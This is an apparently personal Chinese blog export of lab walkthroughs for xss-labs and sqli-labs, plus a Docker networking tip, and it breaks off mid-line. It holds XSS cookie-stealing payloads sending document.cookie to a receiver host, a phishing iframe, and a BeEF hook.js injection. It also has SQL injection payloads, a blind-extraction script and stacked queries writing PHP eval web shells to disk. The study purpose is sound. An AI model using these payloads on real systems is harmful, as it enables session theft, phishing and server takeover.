[{"title":"python 开发xss 扫描工具","url":"/2024/02/19/Web渗透/python 开发xss扫描器/","content":"\n\n\n思路：\n\n1、发送一个带有payload参数值的请求，从响应中判断是否存在Payload。（反射型）\n\n2、准备字典文件作为payload \n\n3、不同类型的payload 区别对待","tags":["web渗透"],"categories":["web渗透"]},{"title":"xss 注入学习","url":"/2024/01/11/Web渗透/xss注入/","content":"\n### XSS注入\n\n#### 1、引入\n\nxss 全称是跨站脚本攻击，核心是构造出能够让前端执行的JavaScript代码。\n测试php代码  test_xss.php\n\n```\n<?php\n   if(isset($_GET['content']))\n   {\n        $content = $_GET['content'];\n        echo $content;\n   }\n   else\n   {\n        echo \"请输入URL地址参数 content\";\n   }\n?>\n```\n\n在地址栏输入如下，代码直接可以执行。\n\n```\nhttp://localhost/test_xss.php/?content=<script>alert(1)</script>\n```\n\njavascript 执行的条件\n\n- 代码位于<script></script>\n  ```\n  <script>alert(1)</script>\n  ```\n\n\n- 代码位于onclick、onmouseover等类似的事件\n  ```\n  <button onclick=\"alert(1)\"> 快来点我</button>\n  ```\n\n- 代码位于超链接的href中\n  ```\n  <a href=\"javascript:alert(1)\">点击有惊喜</a>\n  ```\n\n\n示例： 基于XSS配置钓鱼网站：自行构造一个与淘宝一摸一样的页面，引诱用户登录后，发送给攻击者，再显示账号密码错误，重定向到真实的网站。\n\n```\nhttp://192.168.101.10/test_xss.php/?content=<iframe src='https://taobao.com' width=100%height=100%>\n\n<script> \n    document.write('你的用户名密码不正确，请重新登录'); \n    setTimeout(function(){location.href='https://taobao.com';},3000);\n</script>\n\n```\n\n#### 2、测试步骤（多为反射型）\n\n（1）找到输入点，输入任意字符，查看输出位置\n\n（2）打开网页源代码，在源代码中查找输出的位置\n\n（3）查看输出位置的内容与输入的内容的关系，构建**闭合和拼接脚本**\n\n（4）利用<script>  onclick  alert(1) 进行测试，确认是否存在注入点\n\n（5）开始利用该注入点，执行复杂操作\n\n示例 \n\n```\n正常输入      //  <input type=\"text\" id=\"content\" value=\"123\"/>  value = 123\n注入测试输入 \t//  <input type=\"text\" id=\"content\" value=\"123\" onclick=\"alert(1)\"/>  value= 123\" onclick=\"alert(1)\n              //<input type=\"text\"  value=\"123\"/> <!--\" id=\"content\">   value = 123\"/> <!--  直接闭合标签，注释后面的\n```\n\n#### 3、测试样例\n\n```html\n<!--\ntest1  点击图片跳转到baidu\n<img src=\"./123.png\" onclick=\"location.href=\\'https://www.baidu.com\\'\">\nxxxx\n1111111111\n\n\n<!--  \ntest2   点击图片发送当前cookies和url 到特定服务器  + 用%2B代替  & 用%26 代替\n\n<a href=\\'javascript:location.href=\"http://192.168.101.10/learn/xssrecv.php?url=\"%2Blocation.href%2B\"%26cookie=\"%2Bdocument.cookie\\'>\n<img src=\"http://192.168.101.100/learn/123.png\"/>\n</a>\n\n<!--  \ntest3  无需点击，加载就发送请求\n<script>\n   new Image().src=\"http://192.168.101.100/learn/xssrecv.php?url=\" %2B location.href %2B \"%26cookie=\" %2B document.cookie;\n</script>\n\n\n```\n\n#### 4、xss receiver 部署\n\nbluelotus 是一个 xss漏洞接收平台，可通过docker 直接部署。\n\n```bash\n\ndocker search bluelotus\ndocker pull tanyiqu/bluelotus_xss_receiver\ndocker run -dt --name bluelotus -p 8888:80 --rm tanyiqu/bluelotus_xss_receiver\n```\n\n正常安装以后登录bluelotus 平台，界面如下，在我的JS那里，选择新增你想要的JS，可以选公共模板，然后进行更改，点击下方新增后，再点击生成payload，复制生成的<script>到你目标站点即可，在接收面板等待接收。\n\n![image-20240125225618438](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20240125225618438.png)\n\n![image-20240125225659421](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20240125225659421.png)\n\n![image-20240125225746898](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20240125225746898.png)\n\n#### 5、XSS利用方式\n\n（1）、获取用户Cookie 实现越权\n（2）、钓鱼网站，模拟真实的网站的登录页面，获取用户信息再跳转到真实网站\n（3）、执行JS代码，用于DDos 攻击别的目标站点\n（4）、 恶意链接让用户点击，或者直接将网页植入到站点的iframe标签\n（5）、当用户点击并访问到恶意站点<a href=\"http://xxx.com/xx.html\"> 在xx.html 中可以执行JS代码，提供正常网站功能的同时，执行隐蔽的恶意代码，如挖矿\n\n#### 6、XSS的类型\n\n（1）、反射性   可用扫描器，数据流向  浏览器->后端->浏览器  简单描述 输入的内容在页面原样输出\n\n反射型[xss](https://so.csdn.net/so/search?q=xss&spm=1001.2101.3001.7020)是通过给别人发送带有恶意脚本代码参数的URL，当URL地址被打开时，特有的恶意代码参数被HTML解析、执行。它的特点是非持久化，必须用户点击带有特定参数的链接才能引起。\n\n（2）、存储型   会存储到数据库  如评论等  浏览器->后端-> 数据库->后端->浏览器\n\n最典型的应用就是留言板XSS，用户提交了一条包含XSS代码的留言，然后被存储到数据库中，当有用户查询留言时，从数据库中读取的留言内中的代码就会被浏览器当作JS解析执行。\n\n（3）、DOM型    阅读JS代码，如何输入，如何闭合   URL->浏览器，不经过服务器\n\n利用的步骤与反射性相似，需要诱使受害者访问我们构造的URL，但是URL参数不会发送给服务器，\n\n示例 ：\n\n```\n<html>\n    <head>\n        <title> DOM-XSS TEST </title>\n    </head>\n    <body>\n        <script>\n            var hash = location.hash;\n            if(hash){\n                var url = hash.substring(1);\n                location.href = url;\n            }\n        </script>\n    </body>\n</html>\n\n# payload\nhttp://192.168.101.100/Dom_xss.html#javascript:alert(1)\n```\n\nLocation.hash 返回URL从#到结束的数据，该html的script 中代码 本意是通过#  后面的值来控制跳转，但是因为跳转部分参数是可控的，因此存在DOM XSS漏洞，将参数写在#号后，既可以让JS读取到参数，又不会传到服务器。\n\n\n\n#### 7、XSS的防御\n\n（1）、htmlspecialchar()函数对用户的输入进行处理，把特殊符号转换成实体编码\n（2）、正则表达式以及字符串判断\n\n#### 8、XSS的绕过\n\n（1）、前端直接修改JS代码\n（2）、字符串过滤，双写、大小写、注释等\n（3）、HTML实体转换\n（4）、测试<>是否被过滤转义，若无则直接<img src=1 onerror=alert(1)>\n（5）、输出在script标签内，在保证内部JS语法正确的前提下，去插入payload\n（6）、输出在HTML属性内，首先查看属性是否有双引号包裹，没有则直接添加新的事件属性，有则测试双引号是否可用，而可用则闭合属性后添加新的事件属性\n（7）、输出在JS中，空格被过滤可用/**/代替空格\n（8）、输出在JS注释中，设法插入%0A、%0D使其逃逸\n（9）、输出在JS字符串内，可以利用JS的十六进制，八进制，unicode编码\n（10）、输出在src href action等属性内，可以利用JavaScript:alert(1),以及data:text;base64;加上base64编码后的html\n(11)、payload在特定标签，如<textarea>,<title>,<iframe>,<noscript>,<noframes>,<xmp>,<plaintext>中，JS不会被解析，除非我们将其闭合\n\n#### 9、XSS闯关实验\n\n靶场环境：https://github.com/do0dl3/xss-labs\n\n(1)  第一关  http://localhost/xss-labs/level1.php?name=<script>alert(1)</script>\n\n(2)  第二关 \n\n输出在两个位置都有，一个被转换，一个没有，故可以构造闭合，payload=  \" onclick=\"alert(1)\n\n![image-20240130221340215](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20240130221340215.png)\n\n(3)、第三关\n\n单引号实现闭合  payload = ' onclick='alert(1)\n\n![image-20240130221650732](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20240130221650732.png)\n\n(4)、第四关\n\n双引号闭合  payload = \" onclick=\"alert(1)\n\n![image-20240130221844987](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20240130221844987.png)\n\n(5)、第五关\n\nonclick 会被替换成o_nclick, <scirpt> 会被替换成 <scr_ipt>，改用超链接  payload=\"/><a href=\"javascript:alert(1)\">点我</a>a>\n\n![image-20240130222403774](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20240130222403774.png)\n\n（6）、第六关\n\nonclick  script  href 都被替换 ，大小写绕过  payload = \" Onclick=\"alert(1)\n\n![image-20240130222820283](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20240130222820283.png)\n\n(7)、第七关\n\nonclick 的on会被替换 更改on为oonn   payload = \" oonnclick=\"alert(1)\n\n![image-20240130223528401](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20240130223528401.png)\n\n(8) 、第八关\n\n输入的内容会在href 里面出现，但是javascript 会被替换成javascr_pt，可通过实体转换的方式来解决\n\njavascript:alert(1) 的实体编码：\n\n```\n&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\n```\n\n![image-20240130223916612](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20240130223916612.png)\n\n（9）、第九关 \n\n会对http 链接进行检查，实际是检查输入字符串中是否存在http:// \n\npayload = javascript:alert(1);// 的实体编码加http://    记住要加// 注释掉http:// 不然不会弹框\n\n![image-20240130225404263](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20240130225404263.png)\n\n(10)、第十关\n\n直接修改隐藏的form 表单，修改type 属性为text  , 添加提交按钮 \n\n```\n<input name=\"t_link\" value type=\"text\">\n<input name=\"t_history\" value type=\"text\">\n<input name=\"t_sort\" value type=\"text\">\n<button>提交</button>\n分别三个框输入\" onclick=\"alert(1)\n<input name=\"t_link\" value type=\"hidden\">\n<input name=\"t_history\" value type=\"hidden\">\n<input name=\"t_sort\" value= onclick=\"alert(1)\" type=\"hidden\">\n\n再次修改  t_sort的type 为button 点击button  \n\n```\n\n\n![image-20240130230252983](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20240130230252983.png)\n\n(11) 第十一关\n\n```\n更改refer 为\nhello\" onclick=\"alert(1)\" type=\"button\n```\n\n![image-20240218214901292](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20240218214901292.png)\n\n（12）第12关 \n\n```\n更改UA 为\nhello\" onclick=\"alert(1)\" type=\"button\n```\n\n![image-20240218215046160](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20240218215046160.png)\n\n（13）第十三关 \n\n```\n更改Cookie\nuser=hello\" onclick=\"alert(1)\" type=\"button\n```\n\n(16)第十六关\n\n```\nhttp://192.168.101.100/xss-labs/level16.php?keyword=%3Cbutton%0Aonclick=%22alert(1)%22%3Eupload\n```\n\n(17) 第十七关\n\n```\nhttp://192.168.101.100/xss-labs/level17.php?arg01=a&arg02=b%20onmouseover=alert(1)\n```\n\n（18） 第十八关\n\n```\nhttp://192.168.101.100/xss-labs/level18.php?arg01=a&arg02=b%20onmouseover=alert(1)\n```\n\n#### 10、 XSS 漏洞扫描工具\n\n（1）XSSTrike\n\nhttps://github.com/s0md3v/XSStrike.git\n\n- get 请求测试\n\n  ```\n  python3 xsstrike.py -u http://192.168.101.100/xss-labs/level2.php?keyword=test\n  ```\n\n  ![image-20240220213240555](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20240220213240555.png)\n\n- 测试URL路径\n\n  ```\n  python3 xsstrike.py -u http://192.168.101.100/xss-labs/level2.php  --path\n  ```\n\n- 爬取网站的网页进行测试\n\n  ```\n  python3 xsstrike.py -u http://192.168.101.100/xss-labs/level2.php  --crawl\n  ```\n\n\n- 查找隐藏参数\n\n  ```\n  python3 xsstrike.py -u http://192.168.101.100/xss-labs/level2.php  --params\n  ```\n\n(2) burp \n\n设置好代理以后，target 会自动爬取当前浏览器网页内容，点击scan，选择爬取和审计，即可得到扫描结果。\n\n![image-20240221220144857](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20240221220144857.png)\n\n(3) beef-xss 平台\n\nkaili 2023 安装 beef-xss 过程\n\n```\napt-get update\napt-get install beef-xss\n```\n\n安装后直接运行beef-xss，第一次会提示修改密码，修改后启动beef-xss 服务，Web UI 等。利用时将<script src=\"http://<IP>:3000/hook.js\"></script> 放入存在xss漏洞的位置即可。\n\n![image-20240222222705835](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20240222222705835.png)\n\n利用xss-labs 的第一关来测试一下\n\n```\nhttp://192.168.101.100/xss-labs/level1.php?name=11\" <script src=\"http://192.168.101.7:3000/hook.js\"></script>\n```\n\n随后在beef-xss的web页面上看到，利用成功。当然了beef-xss平台有很多功能，接下来继续探索。\n\n![image-20240222223118511](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20240222223118511.png)\n","tags":["web渗透"],"categories":["web渗透"]},{"title":"虚拟机中的docker 网络问题解决","url":"/2023/12/19/Web渗透/docker 网络访问/","content":"\nWeb 环境 部署在 虚拟机上的docker容器中，虚拟机挂起后访问失败。这是因为 虚拟机在挂起或者重启后，采用桥接网卡的网络设置会发生变更。\n此时需要永久保留虚拟机的网络配置\n\n- 使能进行数据包转发\n\n  ```bash\n  # 修改配置文件\n  \n  vim /usr/lib/sysctl.d/00-system.conf\n  \n  # 尾部添加设置\n  \n  net.ipv4.ip_forward=1\n  ```\n\n  \n\n- 重启网络服务\n\n  ```bash\n  systemctl restart network\n  ```\n\n  \n\n","tags":["web渗透"],"categories":["web渗透"]},{"title":"sqli-labs 学习","url":"/2023/12/16/Web渗透/sqli-labs 实战/","content":"\n1、lesson 1\n\n```\n# 测试步骤1 测试是否是数值型，显示一致，说明不是数值型\nhttp://192.168.101.10:12345/Less-1/?id=1 and 1= 1  正常显示\nhttp://192.168.101.10:12345/Less-1/?id=1 and 1= 2  正常显示 \n# 测试步骤2 加单引号报错，继续测试，两种回显不一致，说明存在注入点，是字符型\nhttp://192.168.101.10:12345/Less-1/?id=1'  报错\nhttp://192.168.101.10:12345/Less-1/?id=1' and '1'='1' --+ 正常显示\nhttp://192.168.101.10:12345/Less-1/?id=1' and '1'='2' --+ 另一种\n# order 确定列数  确认列数为三列\nhttp://192.168.101.10:12345/Less-1/?id=1' order by 1 --+  回显正常\nhttp://192.168.101.10:12345/Less-1/?id=1' order by 2 --+  回显正常\nhttp://192.168.101.10:12345/Less-1/?id=1' order by 3 --+  回显正常\nhttp://192.168.101.10:12345/Less-1/?id=1' order by 4 --+  报错 \n# 联合查询，输出2,3 \nhttp://192.168.101.10:12345/Less-1/?id= -1' union select 1,2,3 --+\n```\n\n2、lesson 2\n\n```\n# 测试步骤1 测试是否是数值型，显示不一致\nhttp://192.168.101.10:12345/Less-2/?id=1 and 1= 1  正常显示\nhttp://192.168.101.10:12345/Less-2/?id=1 and 1= 2  另一种\n\n# 测试步骤2 加单引号报错，进一步确认存在注入点\nhttp://192.168.101.10:12345/Less-2?id=1'\n\n# order 确定列数  确认列数为三列\nhttp://192.168.101.10:12345/Less-2/?id=1 order by 4 --+  报错 \n\n#  联合查询，输出2,3 \nhttp://192.168.101.10:12345/Less-2/?id= -1 union select 1,2,3 --+\n\n```\n\n3、lesson 3\n\n```\n# 测试步骤1 测试是否是数值型，显示一致\nhttp://192.168.101.10:12345/Less-3/?id=1 and 1= 1  正常显示\nhttp://192.168.101.10:12345/Less-3/?id=1 and 1= 2  正常显示\n\n# 测试步骤2 加单引号报错，继续测试，两种回显报错，说明语句有问题,但是是字符型\nhttp://192.168.101.10:12345/Less-3/?id=1'  报错\nhttp://192.168.101.10:12345/Less-3/?id=1' and '1'='1' --+ 报错\n\n# 测试步骤3 ，加)  实际语句应该是 select * from id=('$id') 类似这种\nhttp://192.168.101.10:12345/Less-3/?id=1') and '1'='1' --+ 正常显示\nhttp://192.168.101.10:12345/Less-3/?id=1') and '1'='2' --+ 另一种\n\n# 测试步骤3 order 确定列数  确认列数为三列\nhttp://192.168.101.10:12345/Less-3/?id= 1') order by 4 --+ 报错\n\n# 测试步骤4 联合注入\nhttp://192.168.101.10:12345/Less-3/?id= -1') union select 1,2,3--+\n```\n\n4、lesson 4\n\n```\n# 测试步骤1 测试是否是数值型，显示一致\nhttp://192.168.101.10:12345/Less-4/?id=1 and 1= 1  正常显示\nhttp://192.168.101.10:12345/Less-4/?id=1 and 1= 2  正常显示\n\n# 测试步骤2 加单引号,正常显示，加双引号\nhttp://192.168.101.10:12345/Less-4/?id=1'  正常显示\nhttp://192.168.101.10:12345/Less-4/?id=1\"  报错\nhttp://192.168.101.10:12345/Less-4/?id=1\" and '1'='1' --+ 报错\nhttp://192.168.101.10:12345/Less-4/?id=1\" and \"1\"=\"1\" --+ 报错 \n\n# 测试步骤3 ，加)  实际语句应该是 select * from id=(\"$id\") 类似这种\nhttp://192.168.101.10:12345/Less-4/?id=1\") and \"1\"=\"1\" --+  --+ 正常显示\nhttp://192.168.101.10:12345/Less-4/?id=1\") and \"1\"=\"2\" --+  --+ 另一种\n\n# 测试步骤3 order 确定列数  确认列数为三列\nhttp://192.168.101.10:12345/Less-4/?id=1\") order by 4 --+\n\n# 测试步骤4 联合注入\nhttp://192.168.101.10:12345/Less-4/?id=-1\") union select 1,2,3--+\n```\n\n5、lesson5 \n\n```\n# 测试步骤1 测试是否是数值型，显示一致\nhttp://192.168.101.10:12345/Less-5/?id=1 and 1= 1  正常显示\nhttp://192.168.101.10:12345/Less-5/?id=1 and 1= 2  正常显示\n\n# 测试步骤2 加单引号,正常显示，加双引号\nhttp://192.168.101.10:12345/Less-5/?id=1'  报错\nhttp://192.168.101.10:12345/Less-5/?id=1' and '1'='1' --+ 正常显示\nhttp://192.168.101.10:12345/Less-5/?id=1' and '1'='2' --+ 另一种\n\n# 测试步骤3 order 确定列数  确认列数为三列\nhttp://192.168.101.10:12345/Less-5/?id=1' order by 4 --+\n\n# 测试步骤4 联合注入\nhttp://192.168.101.10:12345/Less-5/?id=-1' union select 1,2,3 --+ 不显示2，3\n\n# 测试步骤5 报错注入\nhttp://192.168.101.10:12345/Less-5/?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) --+  显示数据库名字\n```\n\n6、lesson 6\n\n```\n# 测试步骤1 测试是否是数值型，显示一致\nhttp://192.168.101.10:12345/Less-6/?id=1 and 1= 1  正常显示\nhttp://192.168.101.10:12345/Less-6/?id=1 and 1= 2  正常显示\n\n# 测试步骤2 加单引号,正常显示，加双引号\nhttp://192.168.101.10:12345/Less-6/?id=1'  正常显示\nhttp://192.168.101.10:12345/Less-6/?id=1\"  报错\nhttp://192.168.101.10:12345/Less-6/?id=1\" and \"1\"=\"1\" --+ 正常显示\nhttp://192.168.101.10:12345/Less-6/?id=1\" and \"1\"=\"2\" --+ 另一种\n\n# 测试步骤3 order 确定列数  确认列数为三列\nhttp://192.168.101.10:12345/Less-6/?id=1\" order by 4 --+\n\n# 测试步骤4 联合注入\nhttp://192.168.101.10:12345/Less-6/?id=-1\" union select 1,2,3 --+ 不显示2，3\n\n# 测试步骤5 报错注入\nhttp://192.168.101.10:12345/Less-6/?id=1\" and updatexml(1,concat(0x7e,database(),0x7e),1) --+  显示数据库名字\n```\n\n7、lesson 7\n\n```\n# select 语句  select * from users where id=((\"$id\")) limit 0,1 无回显  只能盲注 ，写文件\n\n# 二分法测试数据库的长度\n# http://192.168.101.10:12345/Less-7/?id=1') AND (SELECT 4670 FROM (SELECT(SLEEP(IF(length(database())=8,0,5))))AWIq) AND ('joMt'='joMt\n\n\n# 代码跑出来数据库名字 security\ndatabase = ''\nfor i in range(1,8+1):\n    for letter, index in enumerate(range(ord('a'), ord('z') + 1)):\n        start = time.time()\n        # header = {\"Cookie\":\"PHPSESSID=7c2076c8b46b66a023cf3b2d2df89341\"}\n        strxx = chr(index)\n        # url = f\"http://192.168.101.10/learn/read.php?id=1 and if (substr(database(),{i},1)='{strxx}',sleep(3),1)\"\n        url = f\"http://192.168.101.10:12345/Less-7/?id=1') AND (SELECT 4670 FROM (SELECT(SLEEP(3-IF(substr(database(),{i},1)='{strxx}',0,3))))AWIq) AND ('joMt'='joMt\"\n        resp = requests.get(url=url)\n        end = time.time()\n        if int(end-start)>=3:\n            database = database + strxx\nprint(database)\n\n\n# outfile  \nhttp://192.168.101.10:12345/Less-7/?id=1\")) union select 1,2,3 into outfile \"/var/www/html/Less-7/muma.php\" --+\n\n\n```\n\n8、lesson 8\n\n```\n# 布尔盲注\nhttp://192.168.101.10:12345/Less-8/?id=1' and length(database())=8 --+ 显示一种\nhttp://192.168.101.10:12345/Less-8/?id=1' and length(database())>8 --+ 显示另一种\n```\n\n9、lesson 9\n\n```\n# 单引号 时间型盲注\nhttp://192.168.101.10:12345/Less-9/?id=1' and IF(length(database())=8,sleep(3),1) --+\n\n# 同样可以代码跑出来，同上\nurl = f\"http://192.168.101.10:12345/Less-9/?id=1' and IF(substr(database(),{i},1)='{strxx}',sleep(3),1) --+\"\n\n```\n\n10、lesson 10\n\n```\n# 双引号 时间型盲注\nhttp://192.168.101.10:12345/Less-10/?id=1\" and IF(length(database())=8,sleep(3),1) --+\n```\n\n11、lesson 11\n\n```\n# 构造报错注入\nuname=admin' or updatexml(1,concat(0x7e,database(),0x7e),1)#&passwd=admin123  \n```\n\n12、lesson 12\n\n```\n# 构造报错注入\nuname=admin\") and updatexml(1,concat(0x7e,database(),0x7e),1)# &passwd=123456\n```\n\n13 、lesson 13\n\n```\n # 构造报错注入\npasswd=admin123') and updatexml(1,concat(0x7e,database(),0x7e),1)# &uname=1234\n```\n\n14、 lesson14\n\n```\npasswd=adminxxx\" and  updatexml(1,concat(0x7e,database(),0x7e),1) # &uname=123\n```\n\n15、lesson 15\n\n```\n# 首先需要知道登录成功的样子\npasswd=123456&uname=Dumb' or 1=1 --+\n# 随后开始测试注入\npasswd=123456&uname=xxx' or length(database())>5 --+\n```\n\n16、lesson 16\n\n```\n# 首先需要知道登录成功的样子\npasswd=admin123 &uname=admin\") or 1=1 --+ \n# 随后开始测试注入\npasswd=admin123 &uname=admin\") or length(database())>5 --+ \n```\n\n17、lesson 17 \n\n```\n# 更新类的报错注入\npasswd=admin123' or updatexml(1,concat(0x7e,database(),0x7e),1) or ' &uname=admin\n```\n\n18、lesson 18\n\n```\n# 已知密码才行\n# user-agent 注入\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36' and updatexml(1,concat(0x7e,database(),0x7e),1),'','')#\n\n' or updatexml(1,concat(0x7e,database(),0x7e),1) or '\n```\n\n19、lesson 19\n\n```\n# refer 注入\nhttp://192.168.101.10:12345/Less-19/' and updatexml(1,concat(0x7e,database(),0x7e),1),'','')#\n' or updatexml(1,concat(0x7e,database(),0x7e),1) or '\n```\n\n20、lesson 20\n\n```\n# cookie 注入\nuname=Dum1' and updatexml(1,concat(0x7e,database(),0x7e),1)--+\nuname=Dumb' or updatexml(1,concat(0x7e,database(),0x7e),1)--+\n\n```\n\n21、lesson21 \n\n```\n# cookie 经过了base64编码\nuname=RHVtYicpIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpICM=\n对应 \nDumb') and updatexml(1,concat(0x7e,database(),0x7e),1) #\n\n```\n\n22、lesson 22\n\n```\nuname = RHVtYiIgb3IgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsZGF0YWJhc2UoKSwweDdlKSwxKSBvciAi\nDumb\" or updatexml(1,concat(0x7e,database(),0x7e),1) or \"\n\n```\n\n23 、lesson 23\n\n```\n# 不能用注释的情况\n# 数值型\nselect * from user where id=1 and 1=1 limit 0,1  payload = 1 and 1=1\n# 字符型\nselect * from user where id='1' and '1'='1' limit 0,1  payload = 1' and '1'='1\n# 所以该题的payload 可以是 -1' or updatexml(1,concat(0x7e,database(),0x7e),1) or '1'='1\nhttp://192.168.101.10:12345/Less-23?id=-1' or updatexml(1,concat(0x7e,database(),0x7e),1) or '1'='1\n```\n\n24 、 lesson24  二次注入\n\n```\n# 先注册  \nusername  admin'#\npassword  123456\n# 更改密码\nusername admin'#\npassword 654321\n# 实际结果如下，反而改了admin 用户的密码\n```\n\n![image-20231228204805297](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231228204805297.png)\n\n25.  and 和or 绕过\n\n    ```\n    # and ==> &&  %26%26  or ==> ||   %7C%7C\n    http://192.168.101.10:12345/Less-25\n    ?id=1' || updatexml(1,concat(0x7e,database(),0x7e),1) --+\n    ```\n\n25a  and和or 绕过  \n\n```\nhttp://192.168.101.10:12345/Less-25a/?id=-1 || length(database())=8\n```\n\n26  空格 注释 绕过\n\n```\nhttp://192.168.101.10:12345/Less-26/?id=1'%20%26%26%20(updatexml(1%2Cconcat(0x7e%2Cdatabase()%2C0x7e)%2C1))%20%26%26'1'='1\n```\n\n26a  空格 注释绕过 ，字符串带引号和括号\n\n```\nhttp://192.168.101.10:12345/Less-26a/?id=1')%20%26%26%20(length(database())=8)%20%26%26('1')=('1\n```\n\n27 union  select 绕过\n\n```\nhttp://192.168.101.10:12345/Less-27/?id=1'%20%26%26%20updatexml(1,concat(0x7e,database(),0x7e),1)%20%26%26%20'1'='1\n```\n\n27 a  union select 双引号 绕过\n\n```\nhttp://192.168.101.10:12345/Less-27a/?id=1\"%20%26%26%20(length(database())=8)%20%26%26\"1\"=\"1\n```\n\n28、 union select  单引号+ 括号  \n\n```\nhttp://192.168.101.10:12345/Less-28/?id=1')%20%26%26%20(length(database())=8)%20%26%26('1')=('1\n```\n\n盲注可以先用1=1 1=2 测试，如果结果不一样，盲注肯定可以\n\n28 a  和28 可以用一个payload\n\n```\nhttp://192.168.101.10:12345/Less-28a/?id=1')%20%26%26%20(length(database())=8)%20%26%26('1')=('1\n```\n\n29 带 WAF 单引号\n\n```\nhttp://192.168.101.10:12345/Less-29/?id=1' and length(database())=8 --+\n```\n\n30 带WAF 双引号\n\n```\nhttp://192.168.101.10:12345/Less-30/?id=1\" and length(database())=8 --+\n```\n\n31、带）的双引号 WAF\n\n```\nhttp://192.168.101.10:12345/Less-31/?id=1\") and length(database())=8 --+\n```\n\n32 单引号转义   宽字节注入\n\n```\nhttp://192.168.101.10:12345/Less-32/?id=1%df' and length(database())=8 --+\n```\n\n33 单引号转义\n\n```\nhttp://192.168.101.10:12345/Less-33/?id=1%df' and length(database())=8 --+\n```\n\n34 、单引号 转义 post 宽字节注入\n\nburp 下才能成功，直接用浏览器会加一些编码，所以会失败\n\n```\nuname=Dumb%df' and updatexml(1,concat(0x7e,database(),0x7e),1)#&passwd=Dumb\n```\n\n![image-20240102220603833](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20240102220603833.png)\n\n35、\n\n```\nhttp://192.168.101.10:12345/Less-35/?id=-1 or updatexml(1,concat(0x7e,database(),0x7e),1)\n```\n\n36 、宽字节注入  \n\n```\nhttp://192.168.101.10:12345/Less-36/?id=1%df' and updatexml(1,concat(0x7e,database(),0x7e),1)--+\n```\n\n37 、post宽字节注入\n\n同样的需要借助于burp，直接在chrome 放payload 会报错，URI malformed\n\n```\nuname=Dumb%df'and updatexml(1,concat(0x7e,database(),0x7e),1) --+ &passwd=Dumb&submit=Submit\n```\n\n![image-20240108224449758](C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240108224449758.png)\n\n38、\n\n```\nhttp://192.168.101.10:12345/Less-38/?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) --+\n```\n\n39、\n\n```\nhttp://192.168.101.10:12345/Less-39/?id=1 and updatexml(1,concat(0x7e,database(),0x7e),1) --+\n```\n\n40、\n\n```\nhttp://192.168.101.10:12345/Less-40/?id=1' and length(database())=8  and '1'='1\n```\n\n41 \n\n```\nhttp://192.168.101.10:12345/Less-41/?id=1 and length(database())=8\n```\n\n42、POST 堆叠注入\n\n```\n# post请求要注意 提交的地址是哪个，另外注意什么是堆叠注入，可以连续执行多个语句\n\nhttp://192.168.101.10:12345/Less-42/login.php\n\nlogin_user=Dumb&login_password=xxxx';select \"<?php @eval($_GET['a']);?>\" into outfile \"/var/www/html/test/muma1.php\";#&mysubmit=Login\n```\n\n43、 POST堆叠注入 多了个一个（）\n\n```\nhttp://192.168.101.10:12345/Less-43/login.php\n\nlogin_user=Dumb&login_password=xxxx');select \"<?php @eval($_GET['a']);?>\" into outfile \"/var/www/html/test/muma2.php\";#&mysubmit=Login\n```\n\n44、\n\n```\n\nhttp://192.168.101.10:12345/Less-44/login.php\n\nlogin_user=Dumb&login_password=xxxx';select \"<?php @eval($_GET['a']);?>\" into outfile \"/var/www/html/test/muma44.php\";#&mysubmit=Login\n```\n\n45、\n\n```\nlogin_user=Dumb&login_password=xxxx');select \"<?php @eval($_GET['a']);?>\" into outfile \"/var/www/html/test/muma45.php\";#&mysubmit=Login\n```\n\n46 、\n\n```\nhttp://192.168.101.10:12345/Less-46?sort=1 AND updatexml(1,concat(0x7e,database(),0x7e),1)\n```\n\n47、\n\n```\nhttp://192.168.101.10:12345/Less-47?sort=1' AND updatexml(1,concat(0x7e,database(),0x7e),1) --+\n```\n\n48、\n\n```\nhttp://192.168.101.10:12345/Less-48?sort=(if(length(database())=8,ID,USERNAME))\n```\n\n49、\n\n```\n\nhttp://192.168.101.10:12345/Less-49?sort=1' and if(length(database())=9,sleep(5),1) and '1'='1\n```\n\n50、\n\n```\nhttp://192.168.101.10:12345/Less-50?sort=1;select \"<?php @eval($_GET['a']);?>\" into outfile \"/var/www/html/test/muma501.php\";#\n```\n\n51、\n\n```\nhttp://192.168.101.10:12345/Less-51?sort=1';select \"<?php @eval($_GET['a']);?>\" into outfile \"/var/www/html/test/muma51.php\";#\n```\n\n52、\n\n```\nhttp://192.168.101.10:12345/Less-52?sort=1;select \"<?php @eval($_GET['a']);?>\" into outfile \"/var/www/html/test/muma52.php\";#\n```\n\n53、\n\n```\nhttp://192.168.101.10:12345/Less-53?sort=1';select \"<?php @eval($_GET['a']);?>\" into outfile \"/var/www/html/test/muma53.php\";#\n```\n\n总结\n\n```\nhttp://192.168.101.10:12345/Less-7/?id=1') and 